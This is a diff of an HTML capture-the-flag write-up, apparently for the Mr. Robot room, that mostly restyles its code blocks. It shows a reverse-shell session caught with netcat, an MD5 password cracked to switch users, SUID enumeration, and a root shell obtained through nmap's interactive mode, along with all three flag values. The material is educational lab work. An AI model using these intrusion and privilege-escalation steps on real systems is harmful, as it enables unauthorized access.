@@ -462,96 +462,102 @@
     ?&gt; 
 </code></pre></div>
 <p>When we paste this code and click update file we get our reverse shell as user daemon. When we go to the home page we see there is a user named robot. In robot directory there is password.raw-md5 and our second flag key-2-of-3.txt . We cant read key-2-of-3.txt. But we can read  password.raw-md5 . Inside of it there is md5 encoded passsword of user robot. When we decode it in <a href="https://md5hashing.net/hash/md5/c3fcd3d76192e4007dfb496cca67e13b">https://md5hashing.net/hash/md5/c3fcd3d76192e4007dfb496cca67e13b</a>  we see password is abcdefghijklmnopqrstuvwxyz . When we login with this password we are in as user robot:</p>
-<pre><code>┌─[root@parrot]─[/home/parrot]
-└──╼ #nc -lvnp 1234
-listening on [any] 1234 ...
-connect to [10.17.51.16] from (UNKNOWN) [10.10.74.164] 50436
-Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
- 10:01:26 up 5 min,  0 users,  load average: 0.02, 0.14, 0.08
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=1(daemon) gid=1(daemon) groups=1(daemon)
-/bin/sh: 0: can&#39;t access tty; job control turned off
-$ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
-daemon@linux:/$ cd /home/robot
-cd /home/robot
-daemon@linux:/home/robot$ ls -la
-ls -la
-total 16
-drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
-drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
--r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
--rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
-daemon@linux:/home/robot$ cat key-2-of-3.txt
-cat key-2-of-3.txt
-cat: key-2-of-3.txt: Permission denied
-daemon@linux:/home/robot$ cat password.raw-md5
-cat password.raw-md5
-robot:c3fcd3d76192e4007dfb496cca67e13b
-daemon@linux:/home/robot$ su robot
-su robot
-Password: abcdefghijklmnopqrstuvwxyz
-
-robot@linux:~$ 
+<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    ┌─[root@parrot]─[/home/parrot]
+    └──╼ #nc -lvnp 1234
+    listening on [any] 1234 ...
+    connect to [10.17.51.16] from (UNKNOWN) [10.10.74.164] 50436
+    Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+     10:01:26 up 5 min,  0 users,  load average: 0.02, 0.14, 0.08
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=1(daemon) gid=1(daemon) groups=1(daemon)
+    /bin/sh: 0: can&#39;t access tty; job control turned off
+    $ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+    daemon@linux:/$ cd /home/robot
+    cd /home/robot
+    daemon@linux:/home/robot$ ls -la
+    ls -la
+    total 16
+    drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+    drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+    -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+    -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+    daemon@linux:/home/robot$ cat key-2-of-3.txt
+    cat key-2-of-3.txt
+    cat: key-2-of-3.txt: Permission denied
+    daemon@linux:/home/robot$ cat password.raw-md5
+    cat password.raw-md5
+    robot:c3fcd3d76192e4007dfb496cca67e13b
+    daemon@linux:/home/robot$ su robot
+    su robot
+    Password: abcdefghijklmnopqrstuvwxyz
+    
+    robot@linux:~$ 
 </code></pre>
 <p>After login as user robot we can read  key-2-of-3.txt:</p>
-<pre><code>robot@linux:~$ cat key-2-of-3.txt
-cat key-2-of-3.txt
-822c73956184f694993bede3eb39f959
+<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    robot@linux:~$ cat key-2-of-3.txt
+    cat key-2-of-3.txt
+    822c73956184f694993bede3eb39f959
 </code></pre>
 <p>After that we use this command to see which files works with root privileges:</p>
-<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
-</code></pre>
+<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
+    find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre></div>
 <p>And then we see there is something interesting. Nmap runs with root privileges:</p>
-<pre><code>robot@linux:~$ find / -perm -u=s -type f 2&gt;/dev/null
-find / -perm -u=s -type f 2&gt;/dev/null
-/bin/ping
-/bin/umount
-/bin/mount
-/bin/ping6
-/bin/su
-/usr/bin/passwd
-/usr/bin/newgrp
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/gpasswd
-/usr/bin/sudo
-/usr/local/bin/nmap
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-/usr/lib/pt_chown
+<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    robot@linux:~$ find / -perm -u=s -type f 2&gt;/dev/null
+    find / -perm -u=s -type f 2&gt;/dev/null
+    /bin/ping
+    /bin/umount
+    /bin/mount
+    /bin/ping6
+    /bin/su
+    /usr/bin/passwd
+    /usr/bin/newgrp
+    /usr/bin/chsh
+    /usr/bin/chfn
+    /usr/bin/gpasswd
+    /usr/bin/sudo
+    /usr/local/bin/nmap
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+    /usr/lib/pt_chown
 </code></pre>
 <p>For to get a root shell with  nmap we go to the <a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a> and then we use this commands from the site to get a root shell:</p>
 <p><img src="pics/M8.png" alt=""></p>
-<pre><code>robot@linux:~$ nmap --interactive
-nmap --interactive
-
-Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
-Welcome to Interactive Mode -- press h &lt;enter&gt; for help
-nmap&gt; !sh
-!sh
-# whoami
-whoami
-root
+<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    robot@linux:~$ nmap --interactive
+    nmap --interactive
+    
+    Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+    Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+    nmap&gt; !sh
+    !sh
+    # whoami
+    whoami
+    root
 </code></pre>
 <p>We see it worked. We got a root shell. So we make final moves to finish this room:</p>
-<pre><code># cd /root/
-cd /root/
-# ls -la
-ls -la
-total 32
-drwx------  3 root root 4096 Nov 13  2015 .
-drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
--rw-------  1 root root 4058 Nov 14  2015 .bash_history
--rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
-drwx------  2 root root 4096 Nov 13  2015 .cache
--rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
--r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
--rw-r--r--  1 root root  140 Feb 20  2014 .profile
--rw-------  1 root root 1024 Sep 16  2015 .rnd
-# cat key-3-of-3.txt
-cat key-3-of-3.txt
-04787ddef27c3dee1ee161b21670b4e4
+<pre style="background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><code>
+    #cd /root/
+    cd /root/
+    # ls -la
+    ls -la
+    total 32
+    drwx------  3 root root 4096 Nov 13  2015 .
+    drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+    -rw-------  1 root root 4058 Nov 14  2015 .bash_history
+    -rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+    drwx------  2 root root 4096 Nov 13  2015 .cache
+    -rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+    -r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+    -rw-r--r--  1 root root  140 Feb 20  2014 .profile
+    -rw-------  1 root root 1024 Sep 16  2015 .rnd
+    # cat key-3-of-3.txt
+    cat key-3-of-3.txt
+    04787ddef27c3dee1ee161b21670b4e4
 </code></pre>
 <p>And done, we got our final flag. Thanks for reading!</p>
